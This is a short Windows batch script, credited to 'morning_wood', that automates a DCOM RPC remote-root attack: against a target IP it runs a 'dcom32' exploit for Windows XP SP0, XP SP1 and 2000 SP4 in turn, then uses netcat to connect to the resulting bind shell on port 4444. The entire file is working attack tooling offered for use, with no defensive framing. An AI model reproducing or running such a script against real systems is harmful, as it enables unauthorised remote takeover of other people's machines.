@echo on
@echo .....................................................
@echo          -= MaX-RPC-r00t for e2-labs.com =-
@echo .....................................................
@echo       SuperScan 3.0 RPC script by morning_wood
@echo ....................................................
wait
@echo ...
@echo trying XP Service Pack 0
dcom32 5 %1
nc -v -n %1 4444

wait
@echo trying XP Service Pack 1
dcom32 6 %1
nc -v -n %1 4444

wait
@echo trying 2K Service Pack 4
dcom32 4 %1
nc -v -n %1 4444
wait
@echo ........... have fun
wait
@echo bye now

exit